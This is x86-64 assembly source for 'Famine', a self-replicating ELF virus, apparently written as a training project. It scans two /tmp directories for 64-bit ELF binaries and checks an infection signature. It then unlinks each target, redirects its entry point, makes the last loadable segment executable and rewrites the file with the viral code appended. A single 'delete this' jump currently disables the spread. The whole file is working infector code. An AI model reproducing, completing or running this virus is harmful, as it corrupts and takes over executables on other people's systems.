	[BITS 64]

	%define SYS_WRITE 	1
	%define SYS_OPEN 	2
	%define SYS_CLOSE 	3
	%define SYS_LSEEK 	8
	%define SYS_MMAP 	9
	%define SYS_MUNMAP 	11
	%define SYS_UNLINK	87
	%define SYS_GETDENTS64	217
	global famine64_func:function
	global famine64_size:data

	section .text

famine64_func:
	push 	rdi
	push 	rsi
	push 	rdx
	push 	rax
	push 	rbx
	sub 	rsp, 8

	jmp 	famine64_end		;delete this
	lea 	rdi, [rel dir_one]
	call 	find_files
	lea 	rdi, [rel dir_two]
	call 	find_files
	jmp 	famine64_end

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;                      void find_files(char *dir_path)                       ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
find_files:
	push 	rbp
	push	rbx
	sub 	rsp, 1044	; char *dirpath, int fd   , int ret   , char b[1024]
						; [rsp]        , [rsp + 8], [rsp + 12], [rsp + 16]
	xor 	eax, eax
	mov 	QWORD [rsp], rdi 		; store dir_path
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_open(dir_path, 0, 0)                                         ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	rdx, 0
	mov 	rsi, 0
	mov 	rdi, QWORD [rsp]
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0 	 			 	; test if < 0
	jl	 	find_files_end
	mov 	DWORD [rsp + 8], eax  	; store directory fd
loop_file:
	xor 	eax, eax
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_getdents(fd, struct linux_dirent64 *dirp, count)             ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp + 8]
	lea 	rsi, [rsp + 16]
	mov 	rdx, 1024
	mov 	rax, SYS_GETDENTS64
	syscall
	test	eax, eax 	 			; test if <= 0
	jle 	loop_end
	mov 	DWORD [rsp + 12], eax  	; store getdents64() return value:
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Return a number of bytes between 0 and 1024 (i defined it)            ;;
	;; In C, we would cast those bytes in struct linux_dirent64 * (see doc.) ;;
	;; to retreive directory files name                                      ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	ebx, ebx 	 				; initialize variable off to 0
	jmp 	check_file_type
next_file:
	;; Next struct linux_dirent64*
	movsx	eax, BYTE [rsp + rbp + 32] 	; 32 is the offset of *dirp->d_reclen
	add 	ebx, eax
	cmp 	DWORD [rsp + 12], ebx
	jle 	loop_file
check_file_type:
	;; Loop throught getdents64() buffer / struct linux_dirent64*
	movsx	rbp, ebx
	cmp 	BYTE [rsp + rbp + 34], 8 	; 34 is the offset of *dirp->d_type
	jne 	next_file 	 				; Check if regular file
	mov 	rdi, QWORD [rsp]
	lea 	rsi, [rsp + rbp + 35]		; 35 is the offset of *dirp->d_name
	call	get_dat_elf
	jmp 	next_file
loop_end:
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int close( int fd )                                                   ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp + 8]
	mov 	rax, SYS_CLOSE
	syscall
find_files_end:	
	add 	rsp, 1044
	pop 	rbx
	pop 	rbp
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;                  void get_dat_elf(char *dir, char *file)                   ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
get_dat_elf:
	push	rbp
	push	rbx
	push 	r8
	push 	r9
	push 	r10
	push 	r11
	sub 	rsp, 1024 	 	; char[1024]
 	 	 	 				; [rsp]

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Concatenate directory path name with file name to open it.            ;;
	;; The string will be stored in [rsp]                                    ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	ecx, ecx 	 	; store int i = 0 to do path[i] = dir[i]
	movzx	edx, BYTE [rdi]
	test	dl, dl 	 		; test directory end of string
	je  	copy_file

copy_dir_bytes:
	mov 	BYTE [rsp + rcx], dl
	inc 	rcx
	movzx	edx, BYTE [rdi + rcx]
	test	dl, dl
	jne 	copy_dir_bytes

copy_file:	
	add 	rsp, rcx
	xor 	eax, eax 	 	; store j = 0 to do path[i + j] = file[j]
	movzx	edx, BYTE [rsi]
	test	dl, dl
	je 	open_file
copy_file_bytes:	
	mov 	BYTE [rsp + rax], dl
	inc 	rax
	movzx	edx, BYTE [rsi + rax]
	test	dl, dl
	jne 	copy_file_bytes

open_file:
	mov 	BYTE [rsp + rax], 0 	; NULL byte the end of the string path
	sub 	rsp, rcx 	 	; Return to the start of the string path
	sub 	rsp, 20 	 	; int fd, size_t size, void *data
 	 	 	 				; [rsp] , [rsp + 4]  , [rsp + 12]
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_open(file_path, O_RDWR|O_NONBLOCK, 0)                        ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	edx, edx
	mov 	esi, 2
	lea 	rdi, [rsp + 20]
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0 	 			; test if < 0
	jl	 	get_dat_elf_end
	mov 	DWORD [rsp], eax	; store FD in [rsp]
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_lseek(fd, 1, LSEEK_END)
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, eax
	mov 	esi, 1
	mov 	edx, 2 	 		; LSEEK_END
	mov 	rax, SYS_LSEEK
	syscall
	cmp 	rax, 0 	 		; test if <= 0
	mov 	r11, rax 	 	; store rax to r11 (see close_file label)
	jle  	close_file
	mov 	QWORD [rsp + 4], rax	; store SIZE in [rsp + 4]
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; void	*mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)    ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor 	edi, edi 	 	; NULL
	mov 	rsi, rax 	 	; size
	mov 	edx, 3 	 		; PROT_READ | PROT_WRITE
	mov 	r10d, 2 	 		; MAP_PRIVATE
	mov 	r8d, DWORD [rsp] 	; fd
	xor 	r9, r9 	 		; 0
	mov 	rax, SYS_MMAP
	syscall
	cmp 	rax, 0 	 		; test if == MAP_FAILED (-1)
	mov 	r11, rax 	 	; store rax to r11 (see close_file label)
	jl  	close_file
	mov 	QWORD [rsp + 12], rax	; store ADDRESS in [RSP + 12]

close_file:	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int close( fd )                                                       ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp] 	; int fd
	mov 	rax, SYS_CLOSE
	syscall
	cmp 	rax, 0 	 			; if we can't close the file, it will be a problem later
	jl  	munmap_file		 	; so we just end the function.
	cmp 	r11, 0 	 			; lseek, and mmap jump to close_file if a problem occurs
	jl  	munmap_file			; in that case we end the function.

	mov 	rdx, QWORD [rsp + 12]	; void *data
	mov 	rsi, QWORD [rsp + 4]	; int size
	lea 	rdi, [rsp + 20] 		; char *path
	call	pack_file

munmap_file:	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int munmap(data, size)                                                ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	rsi, QWORD [rsp + 4]	; int size
	mov 	rdi, QWORD [rsp + 12]	; void *data
	mov 	rax, SYS_MUNMAP
	syscall
get_dat_elf_end:
	add 	rsp, 1044
	pop 	r11
	pop 	r10
	pop 	r9
	pop 	r8
	pop 	rbx
	pop 	rbp
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;              void pack_file(char *path, int size, char *data)              ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
pack_file:
	cmp 	BYTE [rdx], 0x7f 		; compare \x7fELF
	jne 	pack_file_end
	cmp 	BYTE [rdx + 1], 'E'
	jne 	pack_file_end
	cmp 	BYTE [rdx + 2], 'L'
	jne 	pack_file_end
	cmp 	BYTE [rdx + 3], 'F'
	jne 	pack_file_end
	cmp 	BYTE [rdx + 4], 2 		; ->e_ident[EI_CLASS] == ELFCLASS64
	jne 	pack_file_end
	cmp 	BYTE [rdx + 5], 0 		; ->e_ident[EI_DATA] != ELFDATANONE
	je  	pack_file_end
	cmp 	BYTE [rdx + 6], 1 		; ->e_ident[EI_VERSION] == EV_CURRENT
	jne 	pack_file_end
	movzx	eax, BYTE [rdx + 16] 	; ->e_type == ET_EXEC || ->e_type == ET_DYN
	sub 	eax, 2
	cmp 	al, 1
	ja  	pack_file_end
	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 1. Get the Program Header Table end address
	;;    Register RCX will contain it.
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	movzx	ecx, WORD [rdx + 56] 	; ->e_phnum (size: 2)
	mov 	r8, QWORD [rdx + 32] 	; ->e_phoff (size: 8)
	lea 	rax, [rdx + r8] 		; pointer to first segment of Program Header table
	imul	rcx, rcx, 56 			; total size of Program Header table (56: sizeof Elf64_Phdr)
	add 	rcx, r8 	   			; offset to the end of Program Header table
	add 	rcx, rdx 	 			; address of the end of Program Header table
	xor 	r8, r8					; to store the highest lodable segment address
	jmp 	find_highest_pt

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 2. Find the highest memory mapped PT_LOAD segment.
	;;    Register R8 will contain it.
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
first_segment:
	mov 	r8, rax 	 			; assign r8 to be the highest loadable segment
next_program:
	add 	rax, 56 	 			; move to next Program Header segment
	cmp 	rcx, rax 	 			; did we passed the last Program Header segment offset ?
	je  	check_signature
find_highest_pt:
	cmp 	DWORD [rax], 1 			; is the segment loadable ?
	jne 	next_program 			; go to next segment
	test	r8, r8 	 				; test if r8 is null
	je  	first_segment 			; if it is, we have the first loadable segment,
 	 	 	 						; otherwise we compare with the new loadable segment...
	mov 	r9, QWORD [r8 + 16] 	; ->p_vaddr offset (size: 8)
	cmp 	QWORD [rax + 16], r9	; is segment[i].p_vaddr > highest->p_vaddr ?
	cmova	r8, rax					; Move if above (unsigned)
	jmp 	next_program

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 3. Verify if the file is already infected
	;;    ^o^
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
check_signature:	
	test	r8, r8 	 	 			; if no loadable segment has been found, return
	je  	pack_file_end
	;; rdx contains *data
	;; rsi contains size
	;; rdi contains *path
	xor 	rax,rax
	mov 	rax, QWORD [r8 + 8] 	; store ->p_offset
	add 	rax, QWORD [r8 + 40]	; add ->p_memsz to go to end of segment
	sub		eax, 16					; sub 16 to get signature offset
	mov 	rax, QWORD [rdx + rax]
	cmp 	rax, QWORD [rel signature]	; compare
	je  	pack_file_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 4. Erase file from system tree before any changes !!!
	;; 
	;;    int unlink(char *pathname)
	;; 
	;;    RDI already contains *path.
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	rax, SYS_UNLINK
	syscall
	cmp 	rax, 0
	jl  	pack_file_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 5. Make things change
	;;   a. Change the offset of sections higher than the section we infect.
	;;      Infecting the last loadable segment will modify the strtab offset.
	;;      Not doing this will not make the program crash.
	;;      This is only relevant for debugging programs who will not find
	;;      the main and the function of the program.
	;; 	 b. Change the program entry point
	;;   c. Change the Section Header Table offset
	;;   d. Change the infected Segment flags
	;;   e. Change the infected segment memory size
	;; 
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; a-1. Get the offset of the SHT in file                 : R9
	;;      Get the Section Header Table (SHT) entry address  : RAX
	;;      Get the SHT end address                           : RCX
	;;      Get the end offset of the infected segment        : R10
	;; 
	;;      RDX contains Elf Header
	;;      R8 contains infected Program Header Segment
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	r9, QWORD [rdx + 40] 	; ->e_shoff (size: 4)
	lea 	rax, [rdx + r9] 	 	; pointer to first section of SHT
	xor 	rcx, rcx
	movzx	ecx, WORD [rdx + 60]  	; ->e_shnum (size: 2)
	imul	rcx, rcx, 64 			; total size of SHT (64: sizeof Elf64_Shdr)
	add 	rcx, r9 	 	 		; offset to the end of SHT
	add 	rcx, rdx 	 			; address of the end of SHT
	mov 	r10, QWORD [r8 + 8]		; store ->p_offset
	add 	r10, QWORD [r8 + 32]	; add   ->p_filesz

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; a-2. Iterate over Sections Header
	;;      Find sections higher in file than our infected section offset
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
sections_iteration:
	mov 	r11, QWORD [rax + 24]  	; store ->sh_offset
	cmp 	r11, r10  	 			; check if the section is higher than the infected section
	jl  	next_section
	mov 	r11, QWORD [r8 + 16] 	; compare infected->p_vaddr >= section->sh_addr
	cmp 	QWORD [rax + 16], r11
	jge 	next_section
	add 	r11, QWORD [r8 + 32] 	; compare inf->p_vaddr + inf->p_filez < section->sh_addr
	cmp 	QWORD [rax + 16], r11
	jg  	next_section
	xor 	r11, r11 				; modify section offset
	mov 	r11d, DWORD [rel famine64_size]
	add 	QWORD [rax + 24], r11
next_section:
	add 	rax, 64 	 	 		; move to next section
	cmp 	rax, rcx 	 			; check if we are at the end of SHT
	jl  	sections_iteration

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; b. Modify Program Entry Point
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
	xor 	r9, r9
	mov 	rax, QWORD [rdx + 24]  	; First, store the original program entry point
	mov 	r9, QWORD [r8 + 16] 	; store infected segment virtual address (+16: ->p_vaddr)
	add 	r9, QWORD [r8 + 40] 	; add it the segment memory size
 	 	 	 	 					; (value is virtual address of our infected code)
	mov 	QWORD [rdx + 24], r9 	; modify the Program entry point

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; c. Modify Section Header Table offset
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
	xor 	r10, r10
	mov 	r10d, DWORD [rel famine64_size]
	add 	QWORD [rdx + 40], r10 		; modify the Section Header table offset

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; d. Modify Infected Segment permissions
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
	xor 	ecx, ecx
	mov 	ecx, DWORD [r8 + 4] 	; store infected segment permissions (+4: ->p_flags)
	test	cl, 1 	 	 			; see if it is EXECUTABLE
	jne 	modify_sht_memsize
	or  	ecx, 1 	 	 			; if not, make it so
	mov 	DWORD [r8 + 4], ecx

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; e. Modify Infected Segment memory / file size
	;;    r10 contains famine64_size
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
modify_sht_memsize:
	add 	QWORD [r8 + 40], r10  	; change segment memory size
	;mov 	r10, QWORD [r8 + 40]
	add 	QWORD [r8 + 32], r10  	; change segment file size

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 6. Rewrite the program
	;;    a. Re-open the file in write only mode
	;;    b. Copy the original program until the infected segment offset.
	;;    c. Copy our program at the end of it,
	;;       minus the original program virtual address size.
	;;    d. Copy, in our program, the original virtual address size,
	;;       so we will jump to it later.
	;;    e. Copy the rest of the original program.
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	sub 	rsp, 44		; int fd, char *data, size_t size, size_t addr, size_t offset, char *path
 	 	 	 	 		; [rsp] , [rsp + 4] , [rsp + 12]  , [rsp + 20]  , [rsp + 28] , [rsp + 36]

	mov 	DWORD [rsp], 0 	 			; clean [rsp] to store fd later
	mov 	QWORD [rsp + 4], rdx 		; store the address of the program data
	mov 	QWORD [rsp + 12], rsi  		; store the program size
	mov 	QWORD [rsp + 20], rax 		; store the original program entry point
	mov 	rax, QWORD [r8 + 8] 		; store infected->p_offset
	add 	rax, QWORD [r8 + 32] 		;     + infected->p_memsz
	sub 	eax, [rel famine64_size]	;     - famine64_size
	mov 	QWORD [rsp + 28], rax
	lea 	rdi, [rdi]			  		; load file_path address
	mov 	QWORD [rsp + 36], rdi		; store file_path addr
	
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; a. int	sys_open(file_path, O_WRONLY|O_CREAT|O_EXCL|O_DSYNC, 0755)
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edx, 493			; 0755
	mov 	esi, 65				; O_WRONLY|O_CREAT
	mov 	rdi, [rsp + 36]		; file_path
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0 	 	 		; test if < 0
	jl	 	write_end
	mov 	DWORD [rsp], eax 	; store file fd

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; b. int	sys_write(fd, data, IS offset)
	;;    - Write from file[0] to file[injection] -
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, eax 		  		; file fd
	mov 	rsi, QWORD [rsp + 4] 	; pointer of program data
	mov 	rdx, QWORD [rsp + 28] 	; size until our injection
	mov 	rax, SYS_WRITE
	syscall
	cmp 	rax, 0
	jl  	clean_write_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; c. int	sys_write(fd, data, IS offset)
	;;    - Write our injection -
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp] 	 		; file fd
	lea 	rsi, [rel famine64_func] 	; famine64_func
	mov 	edx, [rel famine64_size]	; famine64_size
	sub 	rdx, 8 	 	 				; less the size of jump_vaddr
	mov 	rax, SYS_WRITE
	syscall
	cmp 	rax, 0
	jl  	clean_write_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; d. int	sys_write(fd, data, IS offset)
	;;    - Write original entry point -
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp] 		; file fd
	lea 	rsi, [rsp + 20] 	 	; load the original program entry point address
	mov 	rdx, 8 	 	 			; sizeof jump_vaddr
	mov 	rax, SYS_WRITE
	syscall
	cmp 	rax, 0
	jl  	clean_write_end

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; d. int	sys_write(fd, data, IS offset)
	;;    - Write from file[injection] to file[file_size] -
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov 	edi, DWORD [rsp] 		; file fd
	mov 	rsi, [rsp + 4] 	 		; file first bit
	add 	rsi, QWORD [rsp + 28]	; plus what we already wrote !
	mov 	rdx, QWORD [rsp + 12]  	; file size
	sub 	rdx, QWORD [rsp + 28]	; less what we already wrote !
	mov 	rax, SYS_WRITE
	syscall


	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 7. Close file
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
clean_write_end:
	mov 	edi, DWORD [rsp]
	mov 	rax, SYS_CLOSE
	syscall

write_end:	
	add 	rsp, 44
pack_file_end:
	ret
	
famine64_end:
	add 	rsp, 8
	pop 	rbx
	pop 	rax
	pop 	rdx
	pop 	rsi
	pop 	rdi

	cmp 	QWORD [rel jump_vaddr], 0x0
	je  	no_jump
	push 	QWORD [rel jump_vaddr]
no_jump:
	ret
	nop
	nop
	nop
	
famine64_data:
	famine64_size dd end_of_file - famine64_func
	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
	dir_one db "/tmp/test/", 0
	dir_two db "/tmp/test2/", 0
	signature dd 0x42CAFE42, 0x24EFAC24
	jump_vaddr dq 0x0
end_of_file:
